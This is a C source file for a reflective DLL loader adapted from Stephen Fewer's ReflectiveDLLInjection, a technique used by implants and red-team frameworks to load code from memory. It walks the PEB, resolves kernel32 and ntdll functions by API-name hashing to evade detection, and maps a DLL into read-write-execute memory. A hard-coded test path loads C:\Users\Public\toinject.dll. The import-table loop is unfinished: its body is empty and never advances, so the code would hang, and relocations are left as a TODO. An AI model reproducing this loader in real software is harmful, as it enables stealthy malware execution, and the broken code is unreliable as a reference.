// Reference: https://github.com/stephenfewer/ReflectiveDLLInjection
// Taken and adapted from:
//      https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/dll/src/ReflectiveLoader.c
// Additional references:
//      https://void-stack.github.io/blog/post-Exploring-PEB/
//      https://www.nirsoft.net/kernel_struct/vista/PEB.html
//      https://www.nirsoft.net/kernel_struct/vista/LDR_DATA_TABLE_ENTRY.html
//      https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm
//      https://bruteratel.com/research/feature-update/2021/01/30/OBJEXEC/

#include "loader.h"

void piMemCpy(unsigned char* dst, unsigned char* src, size_t n) {
    for (size_t i = 0; i < n; i++) {
        dst[i] = src[i];
    }
}

DWORD ReflectiveLoader(LPVOID lpParameter) {
    // Function pointers
    LOADLIBRARYA pLoadLibraryA     = NULL;
    GETPROCADDRESS pGetProcAddress = NULL;
    VIRTUALALLOC pVirtualAlloc     = NULL;
    NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = NULL;

    // Initial location of DLL to inject in memory
    ULONG_PTR initialDllBase = (ULONG_PTR)lpParameter;

    // variables for processing the PEB
    PPEB_LDR_DATA pPebLdrData;
    PLDR_DATA_TABLE_ENTRY pebModuleEntry;
    PWSTR pebModuleName;
    DWORD pebModuleNameHash;

    // variables for processing module export tables
    PIMAGE_NT_HEADERS moduleNtHeaders;
    ULONG_PTR moduleBaseAddress;
    PIMAGE_EXPORT_DIRECTORY moduleExportDir;
    PDWORD moduleFuncExportTable;
    PDWORD moduleFuncNameTable;
    PWORD moduleFuncOrdinalTable;
    DWORD apiHashValue;
    USHORT remaining;
    char* funcName;
    UINT32 namesProcessed;
    ULONG_PTR funcAddr;

    // variables for loading the target image
    ULONG_PTR mappedDllBase;
    ULONG_PTR sectionAddr;
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc;
    PIMAGE_THUNK_DATA iltThunk;
    ULONG_PTR iatThunkAddr;

    // Testing
    char dummyDll[] = {
        'C', ':', '\\', 'U', 's', 'e', 'r', 's', '\\', 'P', 'u', 'b', 'l', 'i', 'c', '\\',
        't', 'o', 'i', 'n', 'j', 'e', 'c', 't', '.', 'd', 'l', 'l', 0
    };

    // ===========================================================//
    // Process the kernel's exports for required loader functions //
    // ===========================================================//

    // Access the PEB (x64 only) to get the loaded modules for the host process
    // References: https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb
    // https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data
    pPebLdrData = (PPEB_LDR_DATA)((_PPEB)__readgsqword(0x60))->pLdr;

    // Iterate through and process module entries in the PEB
    pebModuleEntry = (PLDR_DATA_TABLE_ENTRY)pPebLdrData->InMemoryOrderModuleList.Flink;
    while (pebModuleEntry) {
        // get pointer to current module name (unicode string)
        pebModuleName = ((PLDR_DATA_TABLE_ENTRY)pebModuleEntry)->BaseDllName.Buffer;

        // Perform hash comparisons to check if we need to process this module
        // We want kernel32.dll and ntdll.dll
        pebModuleNameHash = djb2_hash_case_insensitive_wide(pebModuleName, pebModuleEntry->BaseDllName.Length);
        if (pebModuleNameHash == KERNEL32DLL_HASH || pebModuleNameHash == NTDLLDLL_HASH) {
            // Process module of interest - get the exported functions
            moduleBaseAddress = (ULONG_PTR)(pebModuleEntry->DllBase);
            moduleNtHeaders = (PIMAGE_NT_HEADERS)(moduleBaseAddress + ((PIMAGE_DOS_HEADER)moduleBaseAddress)->e_lfanew);

            // Get export directory and related export info
            moduleExportDir = (PIMAGE_EXPORT_DIRECTORY)(moduleBaseAddress + moduleNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
            moduleFuncExportTable = (PDWORD)(moduleBaseAddress + moduleExportDir->AddressOfFunctions);
            moduleFuncNameTable = (PDWORD)(moduleBaseAddress + moduleExportDir->AddressOfNames);
            moduleFuncOrdinalTable = (PWORD)(moduleBaseAddress + moduleExportDir->AddressOfNameOrdinals);

            // Grabbing a total of 3 APIs from Kernel32.dll, 1 from Ntdll.dll
            if (pebModuleNameHash == KERNEL32DLL_HASH) {
                remaining = 3;
            } else {
                remaining = 1;
            }

            // Process the exported names and grab the address of the ones that match desired hashes
            namesProcessed = 0;
            while (remaining > 0 && namesProcessed < moduleExportDir->NumberOfNames) {
                funcName = (char *)(moduleBaseAddress + moduleFuncNameTable[namesProcessed]);
                apiHashValue = djb2_hash(funcName);
                if (apiHashValue == LOADLIBRARYA_HASH || apiHashValue == GETPROCADDRESS_HASH || apiHashValue == VIRTUALALLOC_HASH || apiHashValue == NTFLUSHINSTRUCTIONCACHE_HASH) {
                    funcAddr = (ULONG_PTR)(moduleBaseAddress + moduleFuncExportTable[moduleFuncOrdinalTable[namesProcessed]]);
                    if (apiHashValue == LOADLIBRARYA_HASH)
                        pLoadLibraryA = (LOADLIBRARYA)funcAddr;
                    else if (apiHashValue == GETPROCADDRESS_HASH)
                        pGetProcAddress = (GETPROCADDRESS)funcAddr;
                    else if (apiHashValue == VIRTUALALLOC_HASH)
                        pVirtualAlloc = (VIRTUALALLOC)funcAddr;
                    else if (apiHashValue == NTFLUSHINSTRUCTIONCACHE_HASH)
                        pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)funcAddr;

                    remaining--;
                }
                namesProcessed++;
            }
        }

        // No need to continue processing modules once we have our APIs
        if (pLoadLibraryA && pGetProcAddress && pVirtualAlloc && pNtFlushInstructionCache)
            break;

        // Iterate to next module
        pebModuleEntry = (PLDR_DATA_TABLE_ENTRY)pebModuleEntry->InMemoryOrderModuleList.Flink;
    }

    // Map DLL image into new memory location. Future TODO - look into adjusting permissions on a by-section basis
    moduleNtHeaders = (PIMAGE_NT_HEADERS)(initialDllBase + ((PIMAGE_DOS_HEADER)initialDllBase)->e_lfanew);
    mappedDllBase = (ULONG_PTR)pVirtualAlloc(NULL, moduleNtHeaders->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Copy headers
    piMemCpy((unsigned char*)mappedDllBase, (unsigned char*)initialDllBase, moduleNtHeaders->OptionalHeader.SizeOfHeaders);

    // Load in DLL sections - first section starts after optional header
    sectionAddr = (ULONG_PTR)&(moduleNtHeaders->OptionalHeader) + moduleNtHeaders->FileHeader.SizeOfOptionalHeader;
    remaining = moduleNtHeaders->FileHeader.NumberOfSections;
    while (remaining--) {
        piMemCpy(
            (unsigned char*)(mappedDllBase + ((PIMAGE_SECTION_HEADER)sectionAddr)->VirtualAddress), // destination VA
            (unsigned char*)(initialDllBase + ((PIMAGE_SECTION_HEADER)sectionAddr)->PointerToRawData), // original section in mem
            ((PIMAGE_SECTION_HEADER)sectionAddr)->SizeOfRawData
        );

        // advance to next section
        sectionAddr += sizeof(IMAGE_SECTION_HEADER);
    }

    // Process IAT

    // Get first entry to Import Directory Table based on the corresponding data directory entry
    // https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_data_directory
    if (moduleNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(mappedDllBase + moduleNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

        // Last entry is zeroed out
        while (pImportDesc->Name) {
            // Load imported module
            moduleBaseAddress = (ULONG_PTR)pLoadLibraryA((LPCSTR)(mappedDllBase + pImportDesc->Name));

            // Import Lookup Table
            iltThunk = (PIMAGE_THUNK_DATA)(mappedDllBase + pImportDesc->OriginalFirstThunk);

            // IAT
            iatThunkAddr = (ULONG_PTR)(mappedDllBase + pImportDesc->FirstThunk);

            // Process imported functions
            while(DEREF(iatThunkAddr)) {
                // Check if we're doing this by ordinal
                if (pImportDesc->OriginalFirstThunk && iltThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {

                }
            }
        }
    }



    // TODO - process IAT and relocations

    // testing
    if (pLoadLibraryA && pGetProcAddress && pVirtualAlloc && pNtFlushInstructionCache) {
        pLoadLibraryA(dummyDll);
    }

    return 0;
}
